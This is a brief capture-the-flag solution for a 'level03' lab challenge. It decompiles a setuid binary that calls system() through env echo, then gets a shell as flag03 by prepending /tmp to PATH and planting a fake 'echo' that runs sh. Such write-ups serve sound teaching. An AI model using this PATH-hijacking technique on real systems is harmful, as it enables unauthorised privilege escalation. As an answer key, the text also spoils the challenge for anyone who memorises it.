# Solution

```bash
$>scp -P 4242 level03@192.168.56.101:~/level03 .
$>ghidra
```

```c
iVar1 = system("/usr/bin/env echo Exploit me");
```

```bash
$>export PATH=/tmp:$PATH
$>echo sh > /tmp/echo
$>./level03
$>whoami
flag03
$>getflag
```